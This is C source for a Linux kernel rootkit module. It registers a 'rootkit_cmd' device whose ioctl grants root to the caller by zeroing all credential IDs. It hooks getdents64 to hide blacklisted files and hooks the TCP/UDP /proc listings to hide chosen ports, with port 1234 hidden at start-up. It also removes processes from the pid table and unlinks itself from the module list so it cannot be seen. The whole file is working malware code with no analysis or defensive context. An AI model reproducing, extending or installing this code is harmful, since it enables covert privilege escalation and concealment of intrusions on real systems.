#include "utils.h"
#include <linux/pid.h>

static void get_root(void)
{
    struct cred *cred = prepare_creds();
    if (!cred)
        return;
    cred->uid.val = 0;
    cred->gid.val = 0;
    cred->euid.val = 0;
    cred->egid.val = 0;
    cred->fsuid.val = 0;
    cred->fsgid.val = 0;
    cred->suid.val = 0;
    cred->sgid.val = 0;
    commit_creds(cred);
}

long cmd_ioctl(struct file *flip, unsigned int cmd, unsigned long arg)
{
    switch (cmd) {
    case GET_ROOT:
        get_root();
        break;
    case SHOW_MODULE:
        show_module();
        break;
    case HIDE_MODULE:
        hide_module();
        break;
    default:
    }

    return 0;
}

struct file_operations fops = {.unlocked_ioctl = cmd_ioctl};
DEFINE_RWLOCK(file_black_list_lock);
LIST_HEAD(file_black_list);

/**
 * getdents64_evil - Hook the syscall function getdents64
 *
 * It gets the result of `sys_getdents64` and hides the file with the name in
 * the black list.
 */
static int getdents64_evil(const struct pt_regs *regs)
{
    struct linux_dirent __user *dirent =
        (struct linux_dirent __user *) regs->si;
    long size = CALL_ORIGINAL_FUNC_BY_NAME_RET(
        "sys_getdents64", int (*)(const struct pt_regs *regs), int, regs);
    long org_size = size;
    struct linux_dirent *buf, *iter;
    iter = buf = kzalloc(size, GFP_KERNEL);
    if (!buf)
        return size;

    if (copy_from_user(buf, dirent, size))
        goto out;

    struct struct_list *node;
    while ((unsigned long) iter - (unsigned long) buf < size) {
        read_lock(&file_black_list_lock);
        int found = 0;
        list_for_each_entry (node, &file_black_list, list)
            if (strstr(iter->d_name, node->name))
                found = 1;

        read_unlock(&file_black_list_lock);

        if (found) {
            size -= iter->d_reclen;
            memmove((void *) iter, (void *) iter + iter->d_reclen,
                    size - ((unsigned long) iter - (unsigned long) buf));
        } else
            iter = (struct linux_dirent *) ((char *) iter + iter->d_reclen);
    }
    if (copy_to_user(dirent, buf, size))
        size = org_size;
out:
    kfree(buf);
    return size;
}

void hide_file(const char *name)
{
    struct struct_list *node =
        (struct struct_list *) vmalloc(sizeof(struct struct_list));
    if (!node)
        return;
    node->name = vmalloc(strlen(name) + 1);
    if (!node->name) {
        vfree(node);
        return;
    }
    strcpy(node->name, name);
    write_lock(&file_black_list_lock);
    list_add(&node->list, &file_black_list);
    write_unlock(&file_black_list_lock);
}

void show_file(const char *name)
{
    struct struct_list *node, *safe;
    write_lock(&file_black_list_lock);
    list_for_each_entry_safe (node, safe, &file_black_list, list) {
        if (!strcmp(name, node->name)) {
            list_del(&node->list);
            vfree(node->name);
            vfree(node);
            break;
        }
    }
    write_unlock(&file_black_list_lock);
}

DEFINE_RWLOCK(port_black_list_lock);
LIST_HEAD(port_black_list);

static int tcp4_seq_show_evil(struct seq_file *seq, void *v)
{
    if (v == SEQ_START_TOKEN)
        goto RET;
    struct inet_sock *sk = (struct inet_sock *) v;
    struct struct_list *node;
    read_lock(&port_black_list_lock);
    list_for_each_entry (node, &port_black_list, list)
        if (htons(node->num) == sk->inet_sport ||
            htons(node->num) == sk->inet_dport) {
            read_unlock(&port_black_list_lock);
            return 0;
        }
    read_unlock(&port_black_list_lock);
RET:
    return CALL_ORIGINAL_FUNC_BY_NAME_RET(
        "tcp4_seq_show", int (*)(struct seq_file *, void *), int, seq, v);
}

static int udp4_seq_show_evil(struct seq_file *seq, void *v)
{
    if (v == SEQ_START_TOKEN)
        goto RET;
    struct inet_sock *sk = (struct inet_sock *) v;
    struct struct_list *node;
    read_lock(&port_black_list_lock);
    list_for_each_entry (node, &port_black_list, list)
        if (htons(node->num) == sk->inet_sport ||
            htons(node->num) == sk->inet_dport) {
            read_unlock(&port_black_list_lock);
            return 0;
        }
    read_unlock(&port_black_list_lock);
RET:
    return CALL_ORIGINAL_FUNC_BY_NAME_RET(
        "udp4_seq_show", int (*)(struct seq_file *, void *), int, seq, v);
}

void hide_port(unsigned int port)
{
    struct struct_list *node =
        (struct struct_list *) vmalloc(sizeof(struct struct_list));
    if (!node)
        return;
    node->num = port;
    write_lock(&port_black_list_lock);
    list_add(&node->list, &port_black_list);
    write_unlock(&port_black_list_lock);
}

void show_port(unsigned int port)
{
    struct struct_list *node, *safe;
    write_lock(&port_black_list_lock);
    list_for_each_entry_safe (node, safe, &port_black_list, list) {
        if (port == node->num) {
            list_del(&node->list);
            vfree(node);
            break;
        }
    }
    write_unlock(&port_black_list_lock);
}

DEFINE_RWLOCK(tgid_black_list_lock);
LIST_HEAD(tgid_black_list);


void hide_pid(unsigned int tgid)
{
    struct struct_list *node = (struct struct_list *) vmalloc(
        sizeof(struct struct_list) + sizeof(void *));
    if (!node)
        return;
    struct file *f = filp_open("/proc", O_RDONLY, 0);
    if (!f) {
        vfree(node);
        return;
    }
    struct pid_namespace *ns = proc_pid_ns(file_inode(f)->i_sb);
    filp_close(f, 0);
    node->num = tgid;
    *(void **) node->data = idr_find(&ns->idr, tgid);
    idr_replace(&ns->idr, NULL, tgid);
    write_lock(&tgid_black_list_lock);
    list_add(&node->list, &tgid_black_list);
    write_unlock(&tgid_black_list_lock);
}

void show_pid(unsigned int tgid)
{
    struct struct_list *node, *safe;
    struct file *f = filp_open("/proc", O_RDONLY, 0);
    if (!f)
        return;
    struct pid_namespace *ns = proc_pid_ns(file_inode(f)->i_sb);
    filp_close(f, 0);
    write_lock(&tgid_black_list_lock);
    list_for_each_entry_safe (node, safe, &tgid_black_list, list) {
        if (tgid == node->num) {
            idr_replace(&ns->idr, *(void **) node->data, tgid);
            list_del(&node->list);
            vfree(node);
            break;
        }
    }
    write_unlock(&tgid_black_list_lock);
}

void utils_init()
{
    chrdev_add("rootkit_cmd", &fops);
    hook_start(get_syscall(__NR_getdents64), (unsigned long) getdents64_evil,
               "sys_getdents64");
    struct seq_operations *ops = proc_get_seq_ops_by_path("/proc/net/tcp");
    if (ops) {
        hook_start((unsigned long) ops->show,
                   (unsigned long) tcp4_seq_show_evil, "tcp4_seq_show");
    }
    ops = proc_get_seq_ops_by_path("/proc/net/udp");
    if (ops) {
        hook_start((unsigned long) ops->show,
                   (unsigned long) udp4_seq_show_evil, "udp4_seq_show");
    }
    hide_pid(1);
    hide_port(1234);
}

static struct list_head *head = NULL;

void hide_module(void)
{
    if (head)
        return;
    head = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void show_module(void)
{
    if (head) {
        list_add(&THIS_MODULE->list, head);
        head = NULL;
    }
}
